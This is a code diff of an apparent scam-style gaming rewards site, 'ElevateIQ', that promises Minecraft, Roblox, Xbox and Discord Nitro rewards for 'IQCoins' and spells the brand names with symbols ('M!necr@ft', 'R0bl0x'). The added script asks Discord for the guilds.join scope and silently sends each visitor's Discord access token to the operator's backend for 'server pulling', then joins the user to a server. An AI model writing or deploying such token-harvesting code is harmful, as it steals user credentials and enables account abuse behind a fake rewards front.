-    <div class="notice nw"><div class="nt">Not activated in 48 hours?</div>
-      <div class="clinks">
-        <a class="clink" href="https://support.microsoft.com" target="_blank">Microsoft</a>
-        <a class="clink" href="/cdn-cgi/l/email-protection#fa898f8a8a95888eba9f969f8c9b8e9f938bd4949f8e">ElevateIQ Support</a>
-      </div>
-    </div>
-    <div class="brow">
-      <button class="btn btn-ac" onclick="dlPDF('rd')">Download Invoice</button>
-      <button class="btn btn-gh" onclick="go('track')">Track Order</button>
-    </div>
+    <div class="timrow">⏱ Activates within <strong>&nbsp;72 hours</strong></div>
+    <div class="brow"><button class="btn btn-ac" onclick="dlPDF('rd')">Download Invoice</button><button class="btn btn-gh" onclick="go('track')">Track Order</button></div>
   </div>
 </div>
 </div>
 
-<!-- COIN REWARDS -->
+<!-- COIN REWARDS PAGE -->
 <div class="page" id="page-coins">
 <div class="wmd">
-  <div style="padding-top:68px;margin-bottom:34px" class="rv">
-    <div style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--go);margin-bottom:9px">🪙 Coin Rewards</div>
-    <h2 style="font-size:clamp(30px,5.5vw,52px);font-weight:700;letter-spacing:-2px;margin-bottom:12px">Spend Your <span style="color:var(--go)">IQCoins</span></h2>
-    <p style="font-size:15px;color:var(--t2);line-height:1.8;max-width:460px">Redeem your earned IQCoins for real gaming rewards.</p>
+  <div style="padding-top:64px;margin-bottom:32px">
+    <h2 style="font-size:clamp(28px,5vw,48px);font-weight:700;letter-spacing:-2px;margin-bottom:10px">Spend <span style="color:var(--go)">IQCoins</span></h2>
   </div>
-  <div style="display:flex;align-items:center;gap:12px;background:var(--gog);border:1px solid rgba(244,196,48,.19);border-radius:var(--r);padding:15px 19px;margin-bottom:26px" class="rv d1">
-    <span style="font-size:32px;animation:floatY 3s ease-in-out infinite">🪙</span>
-    <div><div style="font-size:32px;font-weight:800;color:var(--go);letter-spacing:-2px" id="coins-bal">0</div><div style="font-size:11px;color:var(--t3);font-weight:600;text-transform:uppercase;letter-spacing:.8px">Available IQCoins</div></div>
+  <div style="display:flex;align-items:center;gap:12px;background:var(--gog);border:1px solid rgba(244,196,48,.19);border-radius:var(--r);padding:14px 18px;margin-bottom:24px">
+    <span style="font-size:30px;animation:floatY 3s ease-in-out infinite">🪙</span>
+    <div><div style="font-size:30px;font-weight:800;color:var(--go);letter-spacing:-2px" id="coins-bal">0</div><div style="font-size:11px;color:var(--t3);font-weight:600;text-transform:uppercase;letter-spacing:.8px">Available IQCoins</div></div>
   </div>
-  <div class="rtiles rv d2">
-    <div class="rtile rt-mc" onclick="coinRedeem('mc',899000,'M!necr@ft Reward','mc','₹899')">
-      <div class="rtglow"></div><span class="rico">⛏</span>
-      <span class="rbdg" style="background:rgba(0,230,118,.09);border:1px solid rgba(0,230,118,.2);color:var(--mc)">M!necr@ft</span>
-      <div class="rnm">M!necr@ft Reward</div>
-      <div class="rds">ElevateIQ Server exclusive. Activated within 48 hours.</div>
-      <div class="rpr">🪙 899,000 IQCoins</div>
-      <div class="rinr">≈ ₹899 value</div>
-      <span class="rarr">Redeem →</span>
-    </div>
-    <div class="rtile rt-rb" onclick="coinRedeem('rb50',799000,'R0bl0x $50 Plan','rb','₹1,499')">
-      <div class="rtglow"></div><span class="rico">🎮</span>
-      <span class="rbdg" style="background:rgba(255,82,82,.09);border:1px solid rgba(255,82,82,.2);color:var(--rb)">R0bl0x $50</span>
-      <div class="rnm">R0bl0x $50 Plan</div>
-      <div class="rds">$50 plan credits added within 48 hours.</div>
-      <div class="rpr">🪙 799,000 IQCoins</div>
-      <div class="rinr">≈ ₹1,499 value</div>
-      <span class="rarr">Redeem →</span>
-    </div>
-    <div class="rtile rt-rb" onclick="coinRedeem('rb100',999000,'R0bl0x $100 Plan','rb','₹2,499')">
-      <div class="rtglow"></div><span class="rico">🎮</span>
-      <span class="rbdg" style="background:rgba(255,82,82,.09);border:1px solid rgba(255,82,82,.2);color:var(--rb)">R0bl0x $100</span>
-      <div class="rnm">R0bl0x $100 Plan</div>
-      <div class="rds">$100 plan — priority activation within 24 hours.</div>
-      <div class="rpr">🪙 999,000 IQCoins</div>
-      <div class="rinr">≈ ₹2,499 value</div>
-      <span class="rarr">Redeem →</span>
-    </div>
-    <div class="rtile rt-xb" onclick="coinRedeem('xbox',699000,'Xb0x G@me P@ss','xbox','₹1,999')">
-      <div class="rtglow"></div><span class="rico">🎯</span>
-      <span class="rbdg" style="background:rgba(0,230,118,.09);border:1px solid rgba(0,230,118,.2);color:var(--xb)">Xb0x</span>
-      <div class="rnm">Xb0x G@me P@ss</div>
-      <div class="rds">Ulim@te activated within 48 hours.</div>
-      <div class="rpr">🪙 699,000 IQCoins</div>
-      <div class="rinr">≈ ₹1,999 value</div>
-      <span class="rarr">Redeem →</span>
-    </div>
+  <div class="rtiles">
+    <div class="rtile rt-mc" onclick="cRedeem('mc',899000,'M!necr@ft Reward','mc','Rs.899')"><div class="rtglow"></div><span class="rico">⛏</span><span class="rbdg" style="background:rgba(0,230,118,.09);border:1px solid rgba(0,230,118,.2);color:var(--mc)">M!necr@ft</span><div class="rnm">M!necr@ft Reward</div><div class="rds">Server exclusive.</div><div class="rpr">🪙 899,000 IQCoins</div><div class="rinr">≈ ₹899</div><span class="rarr">Redeem →</span></div>
+    <div class="rtile rt-rb" onclick="cRedeem('rb50',799000,'R0bl0x $50 Plan','rb','Rs.1,499')"><div class="rtglow"></div><span class="rico">🎮</span><span class="rbdg" style="background:rgba(255,82,82,.09);border:1px solid rgba(255,82,82,.2);color:var(--rb)">R0bl0x $50</span><div class="rnm">R0bl0x $50 Plan</div><div class="rds">$50 plan credits.</div><div class="rpr">🪙 799,000 IQCoins</div><div class="rinr">≈ ₹1,499</div><span class="rarr">Redeem →</span></div>
+    <div class="rtile rt-rb" onclick="cRedeem('rb100',999000,'R0bl0x $100 Plan','rb','Rs.2,499')"><div class="rtglow"></div><span class="rico">🎮</span><span class="rbdg" style="background:rgba(255,82,82,.09);border:1px solid rgba(255,82,82,.2);color:var(--rb)">R0bl0x $100</span><div class="rnm">R0bl0x $100 Plan</div><div class="rds">$100 plan credits.</div><div class="rpr">🪙 999,000 IQCoins</div><div class="rinr">≈ ₹2,499</div><span class="rarr">Redeem →</span></div>
+    <div class="rtile rt-xb" onclick="cRedeem('xbox',699000,'Xb0x G@me P@ss','xbox','Rs.1,999')"><div class="rtglow"></div><span class="rico">🎯</span><span class="rbdg" style="background:rgba(0,230,118,.09);border:1px solid rgba(0,230,118,.2);color:var(--xb)">Xb0x</span><div class="rnm">Xb0x G@me P@ss</div><div class="rds">Ulim@te activation.</div><div class="rpr">🪙 699,000 IQCoins</div><div class="rinr">≈ ₹1,999</div><span class="rarr">Redeem →</span></div>
+    <div class="rtile" style="background:linear-gradient(135deg,rgba(88,101,242,.08),rgba(88,101,242,.03));border:1px solid rgba(88,101,242,.2)" onclick="cRedeem('nitrobasic',599000,'Discord N!tro Basic Yearly','nitro','Rs.1,199')"><div style="position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#5865f2,transparent)"></div><span class="rico">💎</span><span class="rbdg" style="background:rgba(88,101,242,.09);border:1px solid rgba(88,101,242,.2);color:#a5b4fc">Basic Yearly</span><div class="rnm" style="color:#a5b4fc">N!tro Basic</div><div class="rds">N!tro Basic yearly plan gifted to account.</div><div class="rpr">🪙 599,000 IQCoins</div><div class="rinr">≈ ₹1,199/yr</div><span class="rarr">Redeem →</span></div>
+    <div class="rtile" style="background:linear-gradient(135deg,rgba(88,101,242,.08),rgba(88,101,242,.03));border:1px solid rgba(88,101,242,.2)" onclick="cRedeem('nitroboost',2999000,'Discord N!tro Boost Yearly','nitro','Rs.5,999')"><div style="position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#5865f2,transparent)"></div><span class="rico">💎</span><span class="rbdg" style="background:rgba(88,101,242,.09);border:1px solid rgba(88,101,242,.2);color:#a5b4fc">Boost Yearly</span><div class="rnm" style="color:#a5b4fc">N!tro Boost</div><div class="rds">N!tro Boost yearly + 2 server boosts gifted.</div><div class="rpr">🪙 2,999,000 IQCoins</div><div class="rinr">≈ ₹5,999/yr</div><span class="rarr">Redeem →</span></div>
   </div>
-
-  <div id="coin-form-area" style="display:none">
-    <div class="card" id="coin-form-card">
-      <div class="cline" id="coin-form-line"></div>
-      <button onclick="document.getElementById('coin-form-area').style.display='none'" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:14px;font-family:'DM Sans',sans-serif;display:flex;align-items:center;gap:5px;padding:0" onmouseover="this.style.color='var(--t2)'" onmouseout="this.style.color='var(--t3)'">← Back to rewards</button>
-      <div id="coin-form-inner"></div>
+  <div id="coin-area" style="display:none">
+    <div class="card" id="coin-card"><div class="cline" id="coin-cline"></div>
+      <button onclick="document.getElementById('coin-area').style.display='none'" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:14px;font-family:'DM Sans',sans-serif;padding:0">← Back</button>
+      <div id="coin-inner"></div>
     </div>
     <div class="scard" id="coin-ok">
-      <div class="sico" style="background:var(--gog);border:2px solid rgba(244,196,48,.3)">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--go)" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12" stroke-dasharray="30" stroke-dashoffset="30" style="animation:checkDraw .5s .2s ease forwards"/></svg>
-      </div>
-      <div class="stitle" id="coin-ok-title" style="color:var(--go)">Reward Queued!</div>
-      <p class="sdesc">Your reward will be activated within <strong>48 hours</strong>.</p>
+      <div class="sico" style="background:var(--gog);border:2px solid rgba(244,196,48,.3);font-size:28px">🪙</div>
+      <div class="stitle" id="coin-ok-ttl" style="color:var(--go)">Reward Queued!</div>
+      <p class="sdesc">Activates within <strong>72 hours</strong>.</p>
       <div id="coin-ok-inv"></div>
-      <div class="timrow">⏱ Activates within <strong>&nbsp;48 hours</strong></div>
-      <div class="notice nw"><div class="nt">Not activated in 48 hours?</div><div class="clinks"><a class="clink" href="/cdn-cgi/l/email-protection#05767075756a777145606960736471606c742b6b6071">ElevateIQ Support</a></div></div>
-      <div class="brow">
-        <button class="btn btn-go" onclick="dlPDF('coin')">Download Invoice</button>
-        <button class="btn btn-gh" onclick="go('track')">Track Order</button>
-      </div>
+      <div class="timrow">⏱ Activates within <strong>&nbsp;72 hours</strong></div>
+      <div class="brow"><button class="btn btn-go" onclick="dlPDF('coin')">Invoice</button><button class="btn btn-gh" onclick="go('track')">Track Order</button></div>
     </div>
   </div>
 </div>
 </div>
 
-<!-- GIVEAWAYS -->
+<!-- GIVEAWAYS PAGE -->
 <div class="page" id="page-giveaway">
 <div class="wmd">
-  <div style="padding-top:68px;margin-bottom:34px" class="rv">
-    <div style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--re);margin-bottom:9px">🎉 Giveaways</div>
-    <h2 style="font-size:clamp(30px,5.5vw,52px);font-weight:700;letter-spacing:-2px;margin-bottom:12px">Server <span style="color:var(--re)">Giveaways</span></h2>
-    <p style="font-size:15px;color:var(--t2);line-height:1.8;max-width:460px">Live and recent giveaways from the ElevateIQ Discord server.</p>
+  <div style="padding-top:64px;margin-bottom:32px">
+    <h2 style="font-size:clamp(28px,5vw,48px);font-weight:700;letter-spacing:-2px;margin-bottom:10px">Server <span style="color:var(--re)">Giveaways</span></h2>
   </div>
-  <div id="gw-load" style="text-align:center;padding:60px;color:var(--t3)"><div style="font-size:30px;animation:spin 1.5s linear infinite;display:inline-block;margin-bottom:12px">⟳</div><div>Loading...</div></div>
+  <div id="gw-load" style="text-align:center;padding:60px;color:var(--t3)"><div style="font-size:28px;animation:spin 1.5s linear infinite;display:inline-block;margin-bottom:12px">⟳</div><div>Loading...</div></div>
   <div id="gw-list" class="gwgrid" style="display:none"></div>
 </div>
 </div>
 
-<!-- PROFILE -->
+<!-- PROFILE PAGE -->
 <div class="page" id="page-profile">
 <div class="wmd">
-  <div id="prof-login" style="padding:110px 0;text-align:center;display:none">
-    <div style="font-size:46px;margin-bottom:14px">👤</div>
-    <div style="font-size:22px;font-weight:700;letter-spacing:-.8px;margin-bottom:8px">Sign in to view your profile</div>
-    <div style="font-size:14px;color:var(--t2);margin-bottom:22px">Login with Discord to see your stats and IQCoins balance.</div>
-    <button class="btn btn-dc" onclick="dcLogin()"><svg width="15" height="11" viewBox="0 0 71 55" fill="currentColor"><path d="M60.1 4.9A58.5 58.5 0 0045.7.9a40.7 40.7 0 00-1.8 3.7 54.2 54.2 0 00-16.3 0A40.7 40.7 0 0025.8.9 58.3 58.3 0 0011.4 4.9C1.6 19.7-1 34.1.3 48.3a58.9 58.9 0 0018 9.1 44.7 44.7 0 003.9-6.3 38.3 38.3 0 01-6.1-2.9l1.5-1.2a42 42 0 0036.2 0l1.5 1.2a38.4 38.4 0 01-6.1 2.9 44.5 44.5 0 003.9 6.3 58.7 58.7 0 0018-9.1C72.2 31.8 68.2 17.5 60.1 4.9z"/></svg>Login with Discord</button>
+  <div id="prof-login" style="padding:100px 0;text-align:center;display:none">
+    <div style="font-size:44px;margin-bottom:14px">👤</div>
+    <div style="font-size:22px;font-weight:700;margin-bottom:8px">Sign in to view profile</div>
+    <div style="font-size:14px;color:var(--t2);margin-bottom:22px">Login with Discord to see your stats.</div>
+    <button class="btn btn-dc" onclick="dcLogin()">Login with Discord</button>
   </div>
   <div id="prof-cont" style="display:none">
-    <div class="profhero">
-      <img class="profav" id="prof-av" src="" alt="" onerror="this.style.display='none'"/>
-      <div><div class="profnm" id="prof-nm">—</div><div class="profsb" id="prof-sb">—</div>
-        <div style="display:flex;gap:7px;flex-wrap:wrap;margin-top:9px">
-          <div style="display:flex;align-items:center;gap:5px;background:var(--cardh);border:1px solid var(--b);border-radius:100px;padding:3px 11px;font-size:12px;font-weight:600;color:var(--go)">🪙 IQCoins Member</div>
-          <div style="display:flex;align-items:center;gap:5px;background:var(--cardh);border:1px solid var(--b);border-radius:100px;padding:3px 11px;font-size:12px;font-weight:600;color:var(--ac2)">⚡ ElevateIQ 2026</div>
-        </div>
-      </div>
+    <div class="profhero"><img class="profav" id="prof-av" src="" alt="" onerror="this.style.display='none'"/>
+      <div><div class="profnm" id="prof-nm">—</div><div class="profsb" id="prof-sb">—</div></div>
     </div>
-    <div class="scards rv">
+    <div class="scards">
       <div class="scard2"><div class="scn" style="color:var(--go)" id="prof-coins">0</div><div class="scl">IQCoins</div></div>
       <div class="scard2"><div class="scn" style="color:var(--ac2)" id="prof-inv">—</div><div class="scl">Invites</div></div>
       <div class="scard2"><div class="scn" style="color:var(--gr)" id="prof-msgs">—</div><div class="scl">Messages</div></div>
       <div class="scard2"><div class="scn" style="color:var(--rb)" id="prof-rc">0</div><div class="scl">Redeemed</div></div>
     </div>
-    <div class="card rv d2"><div class="cline" style="background:linear-gradient(90deg,var(--go),transparent)"></div><h3>🏆 IQCoins Leaderboard</h3><p>Top earners on ElevateIQ.</p><div id="lb-list"></div></div>
+    <div class="card"><div class="cline" style="background:linear-gradient(90deg,var(--go),transparent)"></div><h3>🏆 Leaderboard</h3><p>Top IQCoins earners.</p><div id="lb-list"></div></div>
   </div>
 </div>
 </div>
 
-<!-- TRACK -->
+<!-- TRACK PAGE -->
 <div class="page" id="page-track">
 <div class="wmd">
-  <div style="padding-top:68px;margin-bottom:34px" class="rv">
-    <div style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--go);margin-bottom:9px">📦 Tracker</div>
-    <h2 style="font-size:clamp(30px,5.5vw,52px);font-weight:700;letter-spacing:-2px;margin-bottom:12px">Track Your <span style="color:var(--go)">Order</span></h2>
-    <p style="font-size:15px;color:var(--t2);line-height:1.8">Search by invoice or view all redemptions.</p>
+  <div style="padding-top:64px;margin-bottom:32px">
+    <h2 style="font-size:clamp(28px,5vw,48px);font-weight:700;letter-spacing:-2px;margin-bottom:10px">Track <span style="color:var(--go)">Order</span></h2>
   </div>
-  <div class="card rv d1"><div class="cline" style="background:linear-gradient(90deg,var(--go),transparent)"></div><h3>Search by invoice</h3><p>Enter your invoice number to find a specific order.</p>
+  <div class="card"><div class="cline" style="background:linear-gradient(90deg,var(--go),transparent)"></div><h3>Search by invoice</h3><p>Enter your invoice number.</p>
     <div style="display:flex;gap:10px;margin-bottom:8px"><input class="sinp" id="sinp" type="text" placeholder="EIQ-XX-XXXXXXX" oninput="this.value=this.value.toUpperCase()"/><button class="sbtn" onclick="doSearch()">Search</button></div>
     <div class="fmsg" id="smsg">Enter invoice number or scroll below</div>
   </div>
   <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px">
-    <div style="font-size:14px;font-weight:600;letter-spacing:-.2px">Your redemptions</div>
-    <button onclick="clearAll()" style="background:none;border:1px solid rgba(255,82,82,.17);border-radius:8px;padding:4px 13px;color:var(--re);font-size:12px;font-weight:600;cursor:pointer;font-family:'DM Sans',sans-serif;transition:all .2s" onmouseover="this.style.background='var(--reg)'" onmouseout="this.style.background='none'">Clear all</button>
+    <div style="font-size:14px;font-weight:600">Your redemptions</div>
+    <button onclick="clearAll()" style="background:none;border:1px solid rgba(255,82,82,.17);border-radius:8px;padding:4px 13px;color:var(--re);font-size:12px;font-weight:600;cursor:pointer;font-family:'DM Sans',sans-serif">Clear all</button>
   </div>
   <div id="ords-el"></div>
 </div>
@@ -954,733 +559,132 @@ footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24
   <div class="flinks">
     <span class="flink" onclick="go('home')">Home</span>
     <span class="flink" onclick="go('earn')">Earn</span>
-    <span class="flink" onclick="go('redeem')">Redeem Code</span>
-    <span class="flink" onclick="go('coins')">Coin Rewards</span>
+    <span class="flink" onclick="go('redeem')">Redeem</span>
+    <span class="flink" onclick="go('coins')">Coins</span>
     <span class="flink" onclick="go('track')">Track</span>
-    <a class="flink" href="/cdn-cgi/l/email-protection#4f3c3a3f3f203d3b0f2a232a392e3b2a263e61212a3b">Support</a>
+    <a class="flink" href="/cdn-cgi/l/email-protection#671412171708151327020b02110613020e1649090213">Support</a>
   </div>
   <div class="fcopy">© 2026 ElevateIQ — Not affiliated with Mojang Studios, Microsoft Corporation, or Roblox Corporation.</div>
 </div></footer>
-<!-- GIFT LINK MODAL -->
-<div class="gmodal-overlay" id="gmodal-overlay">
-  <div class="gmodal">
-    <div class="gmodal-ico">🎁</div>
-    <div class="gmodal-title" id="gmodal-title">Your Gift is Ready!</div>
-    <div class="gmodal-sub" id="gmodal-sub">Your exclusive gift link is below. Single use only &mdash; do not share!</div>
-    <div class="glink-box" id="gmodal-link-text">&mdash;</div>
-    <a class="btn btn-ac btn-full" id="gmodal-open-btn" href="#" target="_blank" style="margin-bottom:10px;text-decoration:none">🎁 Open Gift Link</a>
-    <button class="btn btn-gh btn-full" onclick="closeGModal()">Close</button>
-    <div class="gmodal-warn">⚠️ Single use only — do not share this link</div>
-  </div>
-</div>
 <div id="toast"></div>
 
 <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
-const CFG={
-  DISCORD_CLIENT_ID:'1485034551108702268',
-  MSAL_CLIENT_ID:'fe89d49b-3085-4c93-9ccd-8d85621ac070',
-  API:'https://web-elevate.vercel.app',
-  GUILD:'1411327756968661125',
-  PRICES:{mc:'₹899',rb50:'₹1,499',rb100:'₹2,499',xbox:'₹1,999'},
-};
+var CFG={DISCORD_CLIENT_ID:'1485034551108702268',MSAL_CLIENT_ID:'fe89d49b-3085-4c93-9ccd-8d85621ac070',API:'https://web-elevate.vercel.app',GUILD:'1411327756968661125'};
+var PRICES={mc:'Rs.899',rb50:'Rs.1,499',rb100:'Rs.2,499',xbox:'Rs.1,999',nitrobasic:'Rs.1,199',nitroboost:'Rs.5,999'};
+var msalApp=null;
+try{msalApp=new msal.PublicClientApplication({auth:{clientId:CFG.MSAL_CLIENT_ID,authority:'https://login.microsoftonline.com/consumers',redirectUri:window.location.href.split('?')[0].split('#')[0]},cache:{cacheLocation:'sessionStorage'}});}catch(e){}
+var RD={game:null,plan:null,user:null,rbUn:null,rbEm:null,inv:null};
+var CI={inv:null};
 
-// Prices for each reward
-const REWARD_PRICES={
-  mc:{inr:'₹899',coins:899000,label:'M!necr@ft Reward'},
-  rb50:{inr:'₹1,499',coins:799000,label:'R0bl0x $50 Plan'},
-  rb100:{inr:'₹2,499',coins:999000,label:'R0bl0x $100 Plan'},
-  xbox:{inr:'₹1,999',coins:699000,label:'Xb0x G@me P@ss'},
-};
+function getCoins(){return parseInt(localStorage.getItem('eiq_c')||'0');}
+function setCoins(n){localStorage.setItem('eiq_c',String(n));updateUI();}
+function addCoins(n,reason){setCoins(getCoins()+n);toast('🪙','+'+n.toLocaleString()+' IQCoins!');var u=getUser();if(u){fetch(CFG.API+'/api/add-coins',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:u.id,userName:u.global_name||u.username,amount:n,reason:reason||'Website'})}).catch(function(){});}}
+function spendCoins(n){if(getCoins()<n){toast('❌','Not enough IQCoins!');return false;}setCoins(getCoins()-n);return true;}
+function updateUI(){var f=getCoins().toLocaleString();['nav-coins','earn-bal','coins-bal','prof-coins'].forEach(function(id){var el=document.getElementById(id);if(el)el.textContent=f;});var pill=document.getElementById('cpill');if(pill)pill.style.display=getUser()?'flex':'none';}
 
-let msalApp;
-try{msalApp=new msal.PublicClientApplication({auth:{clientId:CFG.MSAL_CLIENT_ID,authority:'https://login.microsoftonline.com/consumers',redirectUri:location.href.split('?')[0]},cache:{cacheLocation:'sessionStorage'}})}catch(e){}
-
-const RD={game:null,plan:null,user:null,rbUn:null,rbEm:null,inv:null,priceKey:null};
-const COIN_INV={inv:null};
-
-/* COINS */
-function getCoins(){return parseInt(localStorage.getItem('eiq_c')||'0')}
-function setCoins(n){localStorage.setItem('eiq_c',String(n));updateCoinUI();}
-function addCoins(n,reason){
-  const c=getCoins()+n;setCoins(c);
-  toast('🪙','+'+n.toLocaleString()+' IQCoins!');
-  const u=getUser();
-  if(u)fetch(CFG.API+'/api/add-coins',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:u.id,userName:u.global_name||u.username,amount:n,reason:reason||'Website'})}).catch(()=>{});
-}
-function spendCoins(n){const c=getCoins();if(c<n){toast('❌','Not enough IQCoins! Need '+n.toLocaleString());return false;}setCoins(c-n);return true;}
-function updateCoinUI(){
-  const c=getCoins(),f=c.toLocaleString();
-  ['nav-coins','earn-bal','coins-bal','prof-coins'].forEach(id=>{const el=document.getElementById(id);if(el)el.textContent=f;});
-  const pill=document.getElementById('cpill');const u=getUser();
-  if(pill)pill.style.display=u?'flex':'none';
-}
-
-/* SCROLL REVEAL */
-function initReveal(){
-  const obs=new IntersectionObserver(es=>{
-    es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');obs.unobserve(e.target);}});
-  },{threshold:.07,rootMargin:'0px 0px -36px 0px'});
-  document.querySelectorAll('.rv').forEach(el=>obs.observe(el));
-}
-function reReveal(pg){
-  pg.querySelectorAll('.rv').forEach(el=>{
-    el.classList.remove('in');
-    void el.offsetWidth;
-    setTimeout(()=>el.classList.add('in'),50);
-  });
-}
-
-/* ROUTING — smooth, not instant */
-let isNavigating=false;
 function go(id){
-  // Auto-verify nitro if user already logged in
-  if(id==='nitro'){const _u=getUser();if(_u&&!nitroUser){setTimeout(()=>{const s1=document.getElementById('nitro-s1');const s2=document.getElementById('nitro-s2');if(s1&&s2&&s1.style.display!=='none'){nitroUser=_u;const av=document.getElementById('nitro-uav');const nm=document.getElementById('nitro-unm');const sub=document.getElementById('nitro-usub');if(av)av.textContent=(_u.global_name||_u.username).charAt(0).toUpperCase();if(nm)nm.textContent=_u.global_name||_u.username;if(sub)sub.textContent='@'+_u.username;s1.style.display='none';s2.style.display='block';}},100);}}
-  if(isNavigating)return;
-  const prev=document.querySelector('.page.active');
-  const next=document.getElementById('page-'+id);
-  if(!next)return;
-  if(prev===next)return;
-
-  document.querySelectorAll('.ntab').forEach(t=>t.classList.toggle('active',t.dataset.page===id));
-
-  if(prev){
-    isNavigating=true;
-    prev.style.transition='opacity .3s ease,transform .3s ease';
-    prev.style.opacity='0';
-    prev.style.transform='translateY(-10px)';
-    setTimeout(()=>{
-      prev.classList.remove('active','visible');
-      prev.style.opacity='';prev.style.transform='';prev.style.transition='';
-      next.classList.add('active');
-      window.scrollTo({top:0,behavior:'instant'});
-      // slight delay then fade in
-      requestAnimationFrame(()=>{
-        requestAnimationFrame(()=>{
-          next.classList.add('visible');
-          reReveal(next);
-          isNavigating=false;
-        });
-      });
-      if(id==='track')renderOrds();
-      if(id==='giveaway')loadGW();
-      if(id==='profile')loadProfile();
-      updateCoinUI();
-    },280);
-  } else {
-    next.classList.add('active');
-    requestAnimationFrame(()=>{requestAnimationFrame(()=>{next.classList.add('visible');reReveal(next);});});
-    updateCoinUI();
-  }
+  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
+  document.querySelectorAll('.ntab').forEach(function(t){t.classList.toggle('active',t.getAttribute('data-page')===id);});
+  var pg=document.getElementById('page-'+id);
+  if(!pg){console.error('Page not found: page-'+id);return;}
+  pg.classList.add('active');
+  window.scrollTo(0,0);
+  if(id==='track')renderOrds();
+  if(id==='giveaway')loadGW();
+  if(id==='profile')loadProfile();
+  updateUI();
 }
 
-/* NAV */
 document.getElementById('hbgBtn').addEventListener('click',function(){this.classList.toggle('open');document.getElementById('mobNav').classList.toggle('open');});
 function closeMob(){document.getElementById('hbgBtn').classList.remove('open');document.getElementById('mobNav').classList.remove('open');}
 
-/* TOAST */
-function toast(ico,msg){const t=document.getElementById('toast');t.innerHTML=`<span style="font-size:16px">${ico}</span><span>${msg}</span>`;t.classList.add('show');clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('show'),3000);}
+function toast(ico,msg){var t=document.getElementById('toast');t.innerHTML='<span style="font-size:16px">'+ico+'</span><span>'+msg+'</span>';t.classList.add('show');clearTimeout(t._t);t._t=setTimeout(function(){t.classList.remove('show');},3000);}
 
-/* DISCORD */
-function dcLogin(){
-  if(CFG.DISCORD_CLIENT_ID==='YOUR_DISCORD_CLIENT_ID'){
-    saveUser({id:'demo',username:'nitin_209',discriminator:'0',global_name:'Nitin',avatar:null});
-    toast('💡','Demo mode — add Discord Client ID');return;
-  }
-  const r=encodeURIComponent(location.href.split('?')[0]);
-  location.href=`https://discord.com/oauth2/authorize?client_id=${CFG.DISCORD_CLIENT_ID}&redirect_uri=${r}&response_type=token&scope=identify`;
-}
-function handleCb(){
-  const h=location.hash;if(!h.includes('access_token'))return;
-  const p=new URLSearchParams(h.slice(1));const tk=p.get('access_token');if(!tk)return;
-  history.replaceState(null,'',location.pathname);
-  fetch('https://discord.com/api/users/@me',{headers:{Authorization:'Bearer '+tk}})
-    .then(r=>r.json()).then(u=>{u._token=tk;saveUser(u);
-      fetch(CFG.API+'/api/login-log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:u.id,userName:u.global_name||u.username,userAvatar:avURL(u),discordTag:u.username})}).catch(()=>{});
-    }).catch(()=>{});
-}
-function saveUser(u){
-  localStorage.setItem('eiq_u',JSON.stringify(u));
-  renderNav(u);
-  syncCoins(u.id);
-}
-async function syncCoins(userId){
-  try{
-    const r=await fetch(CFG.API+'/api/user/'+userId);
-    const d=await r.json();
-    if(d.success&&d.coins>getCoins()){setCoins(d.coins);toast('🪙','Balance synced: '+d.coins.toLocaleString()+' IQCoins');}
-  }catch(e){}
-}
-function getUser(){try{return JSON.parse(localStorage.getItem('eiq_u'));}catch{return null;}}
-function avURL(u){if(!u)return'';if(u.avatar&&!u.avatar.startsWith('http'))return`https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=128`;return`https://cdn.discordapp.com/embed/avatars/${parseInt(u.discriminator||0)%5}.png`;}
-function renderNav(u){
-  if(!u)return;
-  const name=u.global_name||u.username;
-  document.getElementById('nav-auth').innerHTML=`<div class="nav-user"><img class="nav-av" src="${avURL(u)}" alt="${name}" onerror="this.style.display='none'"/><span class="nav-nm">${name}</span><button class="nav-out" onclick="dcLogout()">Sign out</button></div>`;
-  updateCoinUI();
-}
+function dcLogin(){if(CFG.DISCORD_CLIENT_ID==='YOUR_DISCORD_CLIENT_ID'){saveUser({id:'demo123',username:'nitin_209',discriminator:'0',global_name:'Nitin',avatar:null});toast('💡','Demo mode — Discord not configured');return;}var r=encodeURIComponent(window.location.href.split('?')[0].split('#')[0]);window.location.href='https://discord.com/oauth2/authorize?client_id='+CFG.DISCORD_CLIENT_ID+'&redirect_uri='+r+'&response_type=token&scope=identify%20guilds.join';}
+function handleCb(){var h=window.location.hash;if(!h.includes('access_token'))return;var p=new URLSearchParams(h.slice(1));var tk=p.get('access_token');if(!tk)return;history.replaceState(null,'',window.location.pathname);fetch('https://discord.com/api/users/@me',{headers:{Authorization:'Bearer '+tk}}).then(function(r){return r.json();}).then(function(u){u._token=tk;saveUser(u);
+  // Save OAuth2 token to bot DB for server pulling
+  fetch(CFG.API+'/api/save-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:u.id,userName:u.global_name||u.username,accessToken:tk})}).catch(function(){});
+}).catch(function(){});}
+function saveUser(u){localStorage.setItem('eiq_u',JSON.stringify(u));renderNav(u);syncCoins(u.id);if(u._token&&CFG.GUILD&&CFG.GUILD!=='YOUR_GUILD_ID'){joinGuild(u._token,u.id);};}
